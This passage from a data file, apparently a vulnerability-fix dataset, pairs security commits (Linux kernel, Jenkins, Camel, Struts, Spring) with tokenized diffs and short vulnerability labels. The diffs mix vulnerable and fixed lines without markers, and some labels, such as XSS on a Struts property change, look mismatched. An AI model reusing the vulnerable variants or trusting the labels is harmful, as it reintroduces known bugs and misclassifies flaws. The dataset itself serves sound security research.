"above", "in", "the", "aarp", "queue", "*", "/", "aarp_send_ddp", "(", "dev", ",", "skb", ",", "&", "usat", "-", ">", "sat_addr", ",", "NULL", ")", ";", "}", "SOCK_DEBUG", "(", "sk", ",", "\"", "SK", "%", "p", ":", "Done", "write", "(", "%", "Zd", ")", ".\\", "n", "\"", ",", "sk", ",", "len", ")", ";", "@", "@", "-", "1868", ",", "7", "+", "1870", ",", "6", "@", "@", "static", "struct", "packet_type", "ppptalk_packet_type", "__read_mostly", "=", "{", "static", "unsigned", "char", "ddp_snap_id", "[", "]", "=", "{", "0x08", ",", "0x00", ",", "0x07", ",", "0x80", ",", "0x9B", "}", ";", "/", "*", "Export", "symbols", "for", "use", "by", "drivers", "when", "AppleTalk", "is", "a", "module", "*", "/", "EXPORT_SYMBOL", "(", "aarp_send_ddp", ")", ";", "EXPORT_SYMBOL", "(", "atrtr_get_dev", ")", ";", "EXPORT_SYMBOL", "(", "atalk_find_dev_addr", ")", ";"], "docstring_tokens": ["memory", "leak"]}
{"contents": ["eCryptfs:", "Allocate", "a", "variable", "number", "of", "pages", "for", "file", "headers", "When", "allocating", "the", "memory", "used", "to", "store", "the", "eCryptfs", "header", "contents,", "a", "single,", "zeroed", "page", "was", "being", "allocated", "with", "get_zeroed_page().", "However,", "the", "size", "of", "an", "eCryptfs", "header", "is", "either", "PAGE_CACHE_SIZE", "or", "ECRYPTFS_MINIMUM_HEADER_EXTENT_SIZE", "(8192),", "whichever", "is", "larger,", "and", "is", "stored", "in", "the", "file's", "private_data->crypt_stat->num_header_bytes_at_front", "field.", "ecryptfs_write_metadata_to_contents()", "was", "using", "num_header_bytes_at_front", "to", "decide", "how", "many", "bytes", "should", "be", "written", "to", "the", "lower", "filesystem", "for", "the", "file", "header.", "Unfortunately,", "at", "least", "8K", "was", "being", "written", "from", "the", "page,", "despite", "the", "chance", "of", "the", "single,", "zeroed", "page", "being", "smaller", "than", "8K.", "This", "resulted", "in", "random", "areas", "of", "kernel", "memory", "being", "written", "between", "the", "0x1000", "and", "0x1FFF", "bytes", "offsets", "in", "the", "eCryptfs", "file", "headers", "if", "PAGE_SIZE", "was", "4K.", "This", "patch", "allocates", "a", "variable", "number", "of", "pages,", "calculated", "with", "num_header_bytes_at_front,", "and", "passes", "the", "number", "of", "allocated", "pages", "along", "to", "ecryptfs_write_metadata_to_contents().", "Thanks", "to", "Florian", "Streibelt", "for", "reporting", "the", "data", "leak", "and", "working", "with", "me", "to", "find", "the", "problem.", "2.6.28", "is", "the", "only", "kernel", "release", "with", "this", "vulnerability.", "Corresponds", "to", "Signed-off-by:", "Tyler", "Hicks", "<tyhicks@linux.vnet.ibm.com>", "Acked-by:", "Dustin", "Kirkland", "<kirkland@canonical.com>", "Reviewed-by:", "Eric", "Sandeen", "<sandeen@redhat.com>", "Reviewed-by:", "Eugene", "Teo", "<eugeneteo@kernel.sg>", "Cc:", "Greg", "KH", "<greg@kroah.com>", "Cc:", "dann", "frazier", "<dannf@dannf.org>", "Cc:", "Serge", "E.", "Hallyn", "<serue@us.ibm.com>", "Cc:", "Florian", "Streibelt", "<florian@f-streibelt.de>", "Cc:", "stable@kernel.org", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["@", "@", "-", "1324", ",", "14", "+", "1324", ",", "13", "@", "@", "static", "int", "ecryptfs_write_headers_virt", "(", "char", "*", "page_virt", ",", "size_t", "max", ",", "}", "static", "int", "ecryptfs_write_metadata_to_contents", "(", "struct", "ecryptfs_crypt_stat", "*", "crypt_stat", ",", "struct", "dentry", "*", "ecryptfs_dentry", ",", "char", "*", "virt", ")", "ecryptfs_write_metadata_to_contents", "(", "struct", "dentry", "*", "ecryptfs_dentry", ",", "char", "*", "virt", ",", "size_t", "virt_len", ")", "{", "int", "rc", ";", "rc", "=", "ecryptfs_write_lower", "(", "ecryptfs_dentry", "-", ">", "d_inode", ",", "virt", ",", "0", ",", "crypt_stat", "-", ">", "num_header_bytes_at_front", ")", ";", "0", ",", "virt_len", ")", ";", "if", "(", "rc", ")", "printk", "(", "KERN_ERR", "\"", "%", "s", ":", "Error", "attempting", "to", "write", "header", "\"", "\"", "information", "to", "lower", "file", ";", "rc", "=", "[", "%", "d", "]", "\\", "n", "\"", ",", "__func__", ",", "@", "@", "-", "1341", ",", "7", "+", "1340", ",", "6", "@", "@", "ecryptfs_write_metadata_to_contents", "(", "struct", "ecryptfs_crypt_stat", "*", "crypt_stat", ",", "static", "int", "ecryptfs_write_metadata_to_xattr", "(", "struct", "dentry", "*", "ecryptfs_dentry", ",", "struct", "ecryptfs_crypt_stat", "*", "crypt_stat", ",", "char", "*", "page_virt", ",", "size_t", "size", ")", "{", "int", "rc", ";", "@", "@", "-", "1351", ",", "6", "+", "1349", ",", "17", "@", "@", "ecryptfs_write_metadata_to_xattr", "(", "struct", "dentry", "*", "ecryptfs_dentry", ",", "return", "rc", ";", "}", "static", "unsigned", "long", "ecryptfs_get_zeroed_pages", "(", "gfp_t", "gfp_mask", ",", "unsigned", "int", "order", ")", "{", "struct", "page", "*", "page", ";", "page", "=", "alloc_pages", "(", "gfp_mask", "|", "__GFP_ZERO", ",", "order", ")", ";", "if", "(", "page", ")", "return", "(", "unsigned", "long", ")", "page_address", "(", "page", ")", ";", "return", "0", ";", "}", "/", "**", "*", "ecryptfs_write_metadata", "*", "@", "ecryptfs_dentry", ":", "The", "eCryptfs", "dentry", "@", "@", "-", "1367", ",", "7", "+", "1376", ",", "9", "@", "@", "int", "ecryptfs_write_metadata", "(", "struct", "dentry", "*", "ecryptfs_dentry", ")", "{", "struct", "ecryptfs_crypt_stat", "*", "crypt_stat", "=", "&", "ecryptfs_inode_to_private", "(", "ecryptfs_dentry", "-", ">", "d_inode", ")", "->", "crypt_stat", ";", "unsigned", "int", "order", ";", "char", "*", "virt", ";", "size_t", "virt_len", ";", "size_t", "size", "=", "0", ";", "int", "rc", "=", "0", ";", "@", "@", "-", "1383", ",", "33", "+", "1394", ",", "35", "@", "@", "int", "ecryptfs_write_metadata", "(", "struct", "dentry", "*", "ecryptfs_dentry", ")", "rc", "=", "-", "EINVAL", ";", "goto", "out", ";", "}", "virt_len", "=", "crypt_stat", "-", ">", "num_header_bytes_at_front", ";", "order", "=", "get_order", "(", "virt_len", ")", ";", "/", "*", "Released", "in", "this", "function", "*", "/", "virt", "=", "(", "char", "*", ")", "get_zeroed_page", "(", "GFP_KERNEL", ")", ";", "virt", "=", "(", "char", "*", ")", "ecryptfs_get_zeroed_pages", "(", "GFP_KERNEL", ",", "order", ")", ";", "if", "(", "!", "virt", ")", "{", "printk", "(", "KERN_ERR", "\"", "%", "s", ":", "Out", "of", "memory", "\\", "n", "\"", ",", "__func__", ")", ";", "rc", "=", "-", "ENOMEM", ";", "goto", "out", ";", "}", "rc", "=", "ecryptfs_write_headers_virt", "(", "virt", ",", "PAGE_CACHE_SIZE", ",", "&", "size", ",", "crypt_stat", ",", "ecryptfs_dentry", ")", ";", "rc", "=", "ecryptfs_write_headers_virt", "(", "virt", ",", "virt_len", ",", "&", "size", ",", "crypt_stat", ",", "ecryptfs_dentry", ")", ";", "if", "(", "unlikely", "(", "rc", ")", ")", "{", "printk", "(", "KERN_ERR", "\"", "%", "s", ":", "Error", "whilst", "writing", "headers", ";", "rc", "=", "[", "%", "d", "]", "\\", "n", "\"", ",", "__func__", ",", "rc", ")", ";", "goto", "out_free", ";", "}", "if", "(", "crypt_stat", "-", ">", "flags", "&", "ECRYPTFS_METADATA_IN_XATTR", ")", "rc", "=", "ecryptfs_write_metadata_to_xattr", "(", "ecryptfs_dentry", ",", "crypt_stat", ",", "virt", ",", "size", ")", ";", "rc", "=", "ecryptfs_write_metadata_to_xattr", "(", "ecryptfs_dentry", ",", "virt", ",", "size", ")", ";", "else", "rc", "=", "ecryptfs_write_metadata_to_contents", "(", "crypt_stat", ",", "ecryptfs_dentry", ",", "virt", ")", ";", "rc", "=", "ecryptfs_write_metadata_to_contents", "(", "ecryptfs_dentry", ",", "virt", ",", "virt_len", ")", ";", "if", "(", "rc", ")", "{", "printk", "(", "KERN_ERR", "\"", "%", "s", ":", "Error", "writing", "metadata", "out", "to", "lower", "file", ";", "\"", "\"", "rc", "=", "[", "%", "d", "]", "\\", "n", "\"", ",", "__func__", ",", "rc", ")", ";", "goto", "out_free", ";", "}", "out_free", ":", "free_page", "(", "(", "unsigned", "long", ")", "virt", ")", ";", "free_pages", "(", "(", "unsigned", "long", ")", "virt", ",", "order", ")", ";", "out", ":", "return", "rc", ";", "}"], "docstring_tokens": ["out-of-bounds", "read"]}
{"contents": ["[SECURITY-442]", "Prevent", "session", "fixation", "attack"], "code_tokens": ["@", "@", "-", "60", ",", "6", "+", "60", ",", "7", "@", "@", "import", "org", ".", "kohsuke", ".", "stapler", ".", "HttpRedirect", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "HttpResponse", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "QueryParameter", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "Stapler", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerRequest", ";", "import", "java", ".", "io", ".", "IOException", ";", "@", "@", "-", "201", ",", "6", "+", "202", ",", "11", "@", "@", "public", "void", "initialize", "(", "HttpRequest", "request", ")", "throws", "IOException", "{", "/", "/", "logs", "this", "user", "in", ".", "UsernamePasswordAuthenticationToken", "token", "=", "new", "UsernamePasswordAuthenticationToken", "(", "info", ".", "getEmail", "(", "),", "\"", "\",", "authorities", ")", ";", "/", "/", "prevent", "session", "fixation", "attack", "Stapler", ".", "getCurrentRequest", "(", ").", "getSession", "(", ").", "invalidate", "(", ");", "Stapler", ".", "getCurrentRequest", "(", ").", "getSession", "(", ");", "SecurityContextHolder", ".", "getContext", "(", ").", "setAuthentication", "(", "token", ")", ";", "/", "/", "update", "the", "user", "profile", ".", "User", "u", "=", "User", ".", "get", "(", "token", ".", "getName", "(", "))", ";"], "docstring_tokens": ["session", "fixaction"]}
{"contents": ["compat:", "fix", "4-byte", "infoleak", "via", "uninitialized", "struct", "field", "Commit", "3a4d44b61625", "(\"ntp:", "Move", "adjtimex", "related", "compat", "syscalls", "to", "native", "counterparts\")", "removed", "the", "memset()", "in", "compat_get_timex().", "Since", "then,", "the", "compat", "adjtimex", "syscall", "can", "invoke", "do_adjtimex()", "with", "an", "uninitialized", "->tai.", "If", "do_adjtimex()", "doesn't", "write", "to", "->tai", "(e.g.", "because", "the", "arguments", "are", "invalid),", "compat_put_timex()", "then", "copies", "the", "uninitialized", "->tai", "field", "to", "userspace.", "Fix", "it", "by", "adding", "the", "memset()", "back.", "Fixes:", "3a4d44b61625", "(\"ntp:", "Move", "adjtimex", "related", "compat", "syscalls", "to", "native", "counterparts\")", "Signed-off-by:", "Jann", "Horn", "<jannh@google.com>", "Acked-by:", "Kees", "Cook", "<keescook@chromium.org>", "Acked-by:", "Al", "Viro", "<viro@zeniv.linux.org.uk>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["@", "@", "-", "34", ",", "6", "+", "34", ",", "7", "@", "@", "int", "compat_get_timex", "(", "struct", "timex", "*", "txc", ",", "const", "struct", "compat_timex", "__user", "*", "utp", ")", "{", "struct", "compat_timex", "tx32", ";", "memset", "(", "txc", ",", "0", ",", "sizeof", "(", "struct", "timex", ")", ");", "if", "(", "copy_from_user", "(", "&", "tx32", ",", "utp", ",", "sizeof", "(", "struct", "compat_timex", ")", "))", "return", "-", "EFAULT", ";"], "docstring_tokens": ["leak", "kernel", "pointer"]}
{"contents": ["HID:", "hiddev:", "validate", "num_values", "for", "HIDIOCGUSAGES,", "HIDIOCSUSAGES", "commands", "This", "patch", "validates", "the", "num_values", "parameter", "from", "userland", "during", "the", "HIDIOCGUSAGES", "and", "HIDIOCSUSAGES", "commands.", "Previously,", "if", "the", "report", "id", "was", "set", "to", "HID_REPORT_ID_UNKNOWN,", "we", "would", "fail", "to", "validate", "the", "num_values", "parameter", "leading", "to", "a", "heap", "overflow.", "Cc:", "stable@vger.kernel.org", "Signed-off-by:", "Scott", "Bauer", "<sbauer@plzdonthack.me>", "Signed-off-by:", "Jiri", "Kosina", "<jkosina@suse.cz>"], "code_tokens": ["@", "@", "-", "516", ",", "13", "+", "516", ",", "13", "@", "@", "static", "noinline", "int", "hiddev_ioctl_usage", "(", "struct", "hiddev", "*", "hiddev", ",", "unsigned", "int", "cmd", ",", "goto", "inval", ";", "}", "else", "if", "(", "uref", "-", ">", "usage_index", ">", "=", "field", "-", ">", "report_count", ")", "goto", "inval", ";", "else", "if", "(", "(", "cmd", "=", "=", "HIDIOCGUSAGES", "|", "|", "cmd", "=", "=", "HIDIOCSUSAGES", ")", "&", "&", "(", "uref_multi", "-", ">", "num_values", ">", "HID_MAX_MULTI_USAGES", "|", "|", "uref", "-", ">", "usage_index", "+", "uref_multi", "-", ">", "num_values", ">", "field", "-", ">", "report_count", ")", ")", "goto", "inval", ";", "}", "if", "(", "(", "cmd", "=", "=", "HIDIOCGUSAGES", "|", "|", "cmd", "=", "=", "HIDIOCSUSAGES", ")", "&", "&", "(", "uref_multi", "-", ">", "num_values", ">", "HID_MAX_MULTI_USAGES", "|", "|", "uref", "-", ">", "usage_index", "+", "uref_multi", "-", ">", "num_values", ">", "field", "-", ">", "report_count", ")", ")", "goto", "inval", ";", "switch", "(", "cmd", ")", "{", "case", "HIDIOCGUSAGE", ":", "uref", "-", ">", "value", "=", "field", "-", ">", "value", "[", "uref", "-", ">", "usage_index", "]", ";"], "docstring_tokens": ["a", "buffer", "overflow"]}
{"contents": ["binder:", "fix", "race", "between", "munmap()", "and", "direct", "reclaim", "An", "munmap()", "on", "a", "binder", "device", "causes", "binder_vma_close()", "to", "be", "called", "which", "clears", "the", "alloc->vma", "pointer.", "If", "direct", "reclaim", "causes", "binder_alloc_free_page()", "to", "be", "called,", "there", "is", "a", "race", "where", "alloc->vma", "is", "read", "into", "a", "local", "vma", "pointer", "and", "then", "used", "later", "after", "the", "mm->mmap_sem", "is", "acquired.", "This", "can", "result", "in", "calling", "zap_page_range()", "with", "an", "invalid", "vma", "which", "manifests", "as", "a", "use-after-free", "in", "zap_page_range().", "The", "fix", "is", "to", "check", "alloc->vma", "after", "acquiring", "the", "mmap_sem", "(which", "we", "were", "acquiring", "anyway)", "and", "skip", "zap_page_range()", "if", "it", "has", "changed", "to", "NULL.", "Signed-off-by:", "Todd", "Kjos", "<tkjos@google.com>", "Reviewed-by:", "Joel", "Fernandes", "(Google)", "<joel@joelfernandes.org>", "Cc:", "stable", "<stable@vger.kernel.org>", "Signed-off-by:", "Greg", "Kroah-Hartman", "<gregkh@linuxfoundation.org>"], "code_tokens": ["@", "@", "-", "927", ",", "14", "+", "927", ",", "13", "@", "@", "enum", "lru_status", "binder_alloc_free_page", "(", "struct", "list_head", "*", "item", ",", "index", "=", "page", "-", "alloc", "-", ">", "pages", ";", "page_addr", "=", "(", "uintptr_t", ")", "alloc", "-", ">", "buffer", "+", "index", "*", "PAGE_SIZE", ";", "mm", "=", "alloc", "-", ">", "vma_vm_mm", ";", "if", "(", "!", "mmget_not_zero", "(", "mm", ")", ")", "goto", "err_mmget", ";", "if", "(", "!", "down_write_trylock", "(", "&", "mm", "-", ">", "mmap_sem", ")", ")", "goto", "err_down_write_mmap_sem_failed", ";", "vma", "=", "binder_alloc_get_vma", "(", "alloc", ")", ";", "if", "(", "vma", ")", "{", "if", "(", "!", "mmget_not_zero", "(", "alloc", "-", ">", "vma_vm_mm", ")", ")", "goto", "err_mmget", ";", "mm", "=", "alloc", "-", ">", "vma_vm_mm", ";", "if", "(", "!", "down_read_trylock", "(", "&", "mm", "-", ">", "mmap_sem", ")", ")", "goto", "err_down_write_mmap_sem_failed", ";", "}", "list_lru_isolate", "(", "lru", ",", "item", ")", ";", "spin_unlock", "(", "lock", ")", ";", "@", "@", "-", "945", ",", "10", "+", "944", ",", "9", "@", "@", "enum", "lru_status", "binder_alloc_free_page", "(", "struct", "list_head", "*", "item", ",", "zap_page_range", "(", "vma", ",", "page_addr", ",", "PAGE_SIZE", ")", ";", "trace_binder_unmap_user_end", "(", "alloc", ",", "index", ")", ";", "up_read", "(", "&", "mm", "-", ">", "mmap_sem", ")", ";", "mmput", "(", "mm", ")", ";", "}", "up_write", "(", "&", "mm", "-", ">", "mmap_sem", ")", ";", "mmput", "(", "mm", ")", ";", "trace_binder_unmap_kernel_start", "(", "alloc", ",", "index", ")", ";"], "docstring_tokens": ["use-after-free", "of"]}
{"contents": ["CAMEL-10894", "Fixed", "test", "failure"], "code_tokens": ["@", "@", "-", "173", ",", "7", "+", "173", ",", "7", "@", "@", "protected", "SchemaFactory", "createSchemaFactory", "(", ")", "{", "if", "(", "getResourceResolver", "(", ")", "!", "=", "null", ")", "{", "factory", ".", "setResourceResolver", "(", "getResourceResolver", "(", "))", ";", "}", "if", "(", "!", "Boolean", ".", "parseBoolean", "(", "camelContext", ".", "getProperty", "(", "ACCESS_EXTERNAL_DTD", ")", "))", "{", "if", "(", "camelContext", "!", "=", "null", "&", "&", "!", "Boolean", ".", "parseBoolean", "(", "camelContext", ".", "getProperty", "(", "ACCESS_EXTERNAL_DTD", ")", "))", "{", "try", "{", "factory", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "}", "catch", "(", "SAXException", "e", ")", "{"], "docstring_tokens": ["xml", "external", "entity"]}
{"contents": ["Fixed", "and"], "code_tokens": ["@", "@", "-", "1", ",", "14", "+", "1", ",", "14", "@", "@", "/", "*", "*", "$", "Id", "$", "*", "$", "Id", "$", "*", "*", "Copyright", "2000", "-", "2005", "The", "Apache", "Software", "Foundation", ".", "*", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "@", "@", "-", "24", ",", "10", "+", "24", ",", "7", "@", "@", "import", "java", ".", "math", ".", "BigInteger", ";", "import", "java", ".", "net", ".", "MalformedURLException", ";", "import", "java", ".", "net", ".", "URL", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Enumeration", ";", "import", "java", ".", "util", ".", "Iterator", ";", "import", "java", ".", "util", ".", "MissingResourceException", ";", "import", "java", ".", "util", ".", "*;", "import", "javax", ".", "servlet", ".", "ServletContext", ";", "import", "javax", ".", "servlet", ".", "ServletException", ";", "@", "@", "-", "327", ",", "7", "+", "324", ",", "7", "@", "@", "public", "void", "init", "(", ")", "throws", "ServletException", "{", "initInternal", "(", ");", "initOther", "(", ");", "initServlet", "(", ");", "getServletContext", "(", ").", "setAttribute", "(", "Globals", ".", "ACTION_SERVLET_KEY", ",", "this", ")", ";", "initModuleConfigFactory", "(", ");", "/", "/", "Initialize", "modules", "as", "needed", "@", "@", "-", "336", ",", "7", "+", "333", ",", "7", "@", "@", "public", "void", "init", "(", ")", "throws", "ServletException", "{", "initModuleDataSources", "(", "moduleConfig", ")", ";", "initModulePlugIns", "(", "moduleConfig", ")", ";", "moduleConfig", ".", "freeze", "(", ");", "Enumeration", "names", "=", "getServletConfig", "(", ").", "getInitParameterNames", "(", ");", "while", "(", "names", ".", "hasMoreElements", "(", "))", "{", "String", "name", "=", "(", "String", ")", "names", ".", "nextElement", "(", ");", "@", "@", "-", "351", ",", "23", "+", "348", ",", "23", "@", "@", "public", "void", "init", "(", ")", "throws", "ServletException", "{", "initModulePlugIns", "(", "moduleConfig", ")", ";", "moduleConfig", ".", "freeze", "(", ");", "}", "this", ".", "initModulePrefixes", "(", "this", ".", "getServletContext", "(", "))", ";", "this", ".", "destroyConfigDigester", "(", ");", "}", "catch", "(", "UnavailableException", "ex", ")", "{", "throw", "ex", ";", "}", "catch", "(", "Throwable", "t", ")", "{", "/", "/", "The", "follow", "error", "message", "is", "not", "retrieved", "from", "internal", "message", "/", "/", "resources", "as", "they", "may", "not", "have", "been", "able", "to", "have", "been", "/", "/", "resources", "as", "they", "may", "not", "have", "been", "able", "to", "have", "been", "/", "/", "initialized", "log", ".", "error", "(", "\"", "Unable", "to", "initialize", "Struts", "ActionServlet", "due", "to", "an", "\"", "+", "\"", "unexpected", "exception", "or", "error", "thrown", ",", "so", "marking", "the", "\"", "+", "\"", "servlet", "as", "unavailable", ".", "Most", "likely", ",", "this", "is", "due", "to", "an", "\"", "+", "\"", "incorrect", "or", "missing", "library", "dependency", ".", "\",", "t", ")", ";", "throw", "new", "UnavailableException", "(", "t", ".", "getMessage", "(", "))", ";", "}", "}", "}", "/", "**", "@", "@", "-", "726", ",", "13", "+", "723", ",", "13", "@", "@", "protected", "void", "parseModuleConfigFile", "(", "Digester", "digester", ",", "String", "path", ")", "if", "(", "url", "=", "=", "null", ")", "{", "url", "=", "getClass", "(", ").", "getResource", "(", "path", ")", ";", "}", "if", "(", "url", "=", "=", "null", ")", "{", "String", "msg", "=", "internal", ".", "getMessage", "(", "\"", "configMissing", "\"", ",", "path", ")", ";", "log", ".", "error", "(", "msg", ")", ";", "throw", "new", "UnavailableException", "(", "msg", ")", ";", "}", "InputSource", "is", "=", "new", "InputSource", "(", "url", ".", "toExternalForm", "(", "))", ";", "input", "=", "url", ".", "openStream", "(", ");", "is", ".", "setByteStream", "(", "input", ")", ";", "@", "@", "-", "1060", ",", "8", "+", "1057", ",", "13", "@", "@", "protected", "void", "initInternal", "(", ")", "throws", "ServletException", "{", "*", "@", "exception", "ServletException", "if", "we", "cannot", "initialize", "these", "resources", "*", "/", "protected", "void", "initOther", "(", ")", "throws", "ServletException", "{", "HashSet", "suppressProperties", "=", "new", "HashSet", "(", ");", "suppressProperties", ".", "add", "(", "\"", "class", "\"", ");", "suppressProperties", ".", "add", "(", "\"", "multipartRequestHandler", "\"", ");", "suppressProperties", ".", "add", "(", "\"", "resultValueMap", "\"", ");", "PropertyUtils", ".", "addBeanIntrospector", "(", "SuppressPropertiesBeanIntrospector", ".", "SUPPRESS_CLASS", ")", ";", "new", "SuppressPropertiesBeanIntrospector", "(", "suppressProperties", ")", ");", "PropertyUtils", ".", "clearDescriptors", "(", ");", "String", "value", "=", "null", ";"], "docstring_tokens": ["cross-site", "scripting", "(xss", ")"]}
{"contents": ["Update", "CORS", "support", "This", "commit", "updates", "CORS", "support", "in", "order", "to", "check", "Origin", "header", "in", "CorsUtils#isPreFlightRequest", "which", "does", "not", "change", "how", "Spring", "MVC", "or", "WebFlux", "process", "CORS", "request", "but", "is", "more", "correct", "in", "term", "of", "behavior", "since", "it", "is", "a", "public", "API", "potentially", "used", "in", "another", "contexts.", "It", "also", "removes", "an", "unnecessary", "check", "in", "AbstractHandlerMethodMapping#hasCorsConfigurationSource", "and", "processes", "every", "preflight", "request", "with", "PreFlightHandler.", "Closes", "gh-24327"], "code_tokens": ["@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2020", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "66", ",", "12", "+", "66", ",", "12", "@", "@", "else", "if", "(", "\"", "https", "\"", ".", "equals", "(", "scheme", ")", "|", "|", "\"", "wss", "\"", ".", "equals", "(", "scheme", ")", ")", "{", "}", "/", "**", "*", "Returns", "{", "@", "code", "true", "}", "if", "the", "request", "is", "a", "valid", "CORS", "pre", "-", "flight", "one", ".", "*", "To", "be", "used", "in", "combination", "with", "{", "@", "link", "#", "isCorsRequest", "(", "HttpServletRequest", ")", "}", "since", "*", "regular", "CORS", "checks", "are", "not", "invoked", "here", "for", "performance", "reasons", ".", "*", "Returns", "{", "@", "code", "true", "}", "if", "the", "request", "is", "a", "valid", "CORS", "pre", "-", "flight", "one", "by", "checking", "{", "code", "OPTIONS", "}", "method", "with", "*", "{", "@", "code", "Origin", "}", "and", "{", "@", "code", "Access", "-", "Control", "-", "Request", "-", "Method", "}", "headers", "presence", ".", "*", "/", "public", "static", "boolean", "isPreFlightRequest", "(", "HttpServletRequest", "request", ")", "{", "return", "(", "HttpMethod", ".", "OPTIONS", ".", "matches", "(", "request", ".", "getMethod", "(", "))", "&", "&", "request", ".", "getHeader", "(", "HttpHeaders", ".", "ORIGIN", ")", "!", "=", "null", "&", "&", "request", ".", "getHeader", "(", "HttpHeaders", ".", "ACCESS_CONTROL_REQUEST_METHOD", ")", "!", "=", "null", ")", ";", "}", "@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2020", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "45", ",", "12", "+", "45", ",", "14", "@", "@", "public", "static", "boolean", "isCorsRequest", "(", "ServerHttpRequest", "request", ")", "{", "}", "/", "**", "*", "Returns", "{", "@", "code", "true", "}", "if", "the", "request", "is", "a", "valid", "CORS", "pre", "-", "flight", "one", ".", "*", "To", "be", "used", "in", "combination", "with", "{", "@", "link", "#", "isCorsRequest", "(", "ServerHttpRequest", ")", "}", "since", "*", "regular", "CORS", "checks", "are", "not", "invoked", "here", "for", "performance", "reasons", ".", "*", "Returns", "{", "@", "code", "true", "}", "if", "the", "request", "is", "a", "valid", "CORS", "pre", "-", "flight", "one", "by", "checking", "{", "code", "OPTIONS", "}", "method", "with", "*", "{", "@", "code", "Origin", "}", "and", "{", "@", "code", "Access", "-", "Control", "-", "Request", "-", "Method", "}", "headers", "presence", ".", "*", "/", "public", "static", "boolean", "isPreFlightRequest", "(", "ServerHttpRequest", "request", ")", "{", "return", "(", "request", ".", "getMethod", "(", ")", "=", "=", "HttpMethod", ".", "OPTIONS", "&", "&", "request", ".", "getHeaders", "(", ").", "containsKey", "(", "HttpHeaders", ".", "ACCESS_CONTROL_REQUEST_METHOD", ")", ");", "HttpHeaders", "headers", "=", "request", ".", "getHeaders", "(", ");", "return", "(", "request", ".", "getMethod", "(", ")", "=", "=", "HttpMethod", ".", "OPTIONS", "&", "&", "headers", ".", "containsKey", "(", "HttpHeaders", ".", "ORIGIN", ")", "&", "&", "headers", ".", "containsKey", "(", "HttpHeaders", ".", "ACCESS_CONTROL_REQUEST_METHOD", ")", ");", "}", "/", "**", "@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2020", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "182", ",", "8", "+", "182", ",", "8", "@", "@", "protected", "String", "formatMappingName", "(", ")", "{", "if", "(", "logger", ".", "isDebugEnabled", "(", "))", "{", "logger", ".", "debug", "(", "exchange", ".", "getLogPrefix", "(", ")", "+", "\"", "Mapped", "to", "\"", "+", "handler", ")", ";", "}", "if", "(", "hasCorsConfigurationSource", "(", "handler", ")", ")", "{", "ServerHttpRequest", "request", "=", "exchange", ".", "getRequest", "(", ");", "ServerHttpRequest", "request", "=", "exchange", ".", "getRequest", "(", ");", "if", "(", "hasCorsConfigurationSource", "(", "handler", ")", "|", "|", "CorsUtils", ".", "isPreFlightRequest", "(", "request", ")", ")", "{", "CorsConfiguration", "config", "=", "(", "this", ".", "corsConfigurationSource", "!", "=", "null", "?", "this", ".", "corsConfigurationSource", ".", "getCorsConfiguration", "(", "exchange", ")", ":", "null", ")", ";", "CorsConfiguration", "handlerConfig", "=", "getCorsConfiguration", "(", "handler", ",", "exchange", ")", ";", "config", "=", "(", "config", "!", "=", "null", "?", "config", ".", "combine", "(", "handlerConfig", ")", ":", "handlerConfig", ")", ";", "@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2019", "the", "original", "author", "or", "authors", ".", "*", "Copyright", "2002", "-", "2020", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "374", ",", "8", "+", "374", ",", "7", "@", "@", "protected", "HandlerMethod", "handleNoMatch", "(", "Set", "<", "T", ">", "mappings", ",", "ServerWebExchange", "exchang", "@", "Override", "protected", "boolean", "hasCorsConfigurationSource", "(", "Object", "handler", ")", "{", "return", "super", ".", "hasCorsConfigurationSource", "(", "handler", ")", "|", "|", "(", "handler", 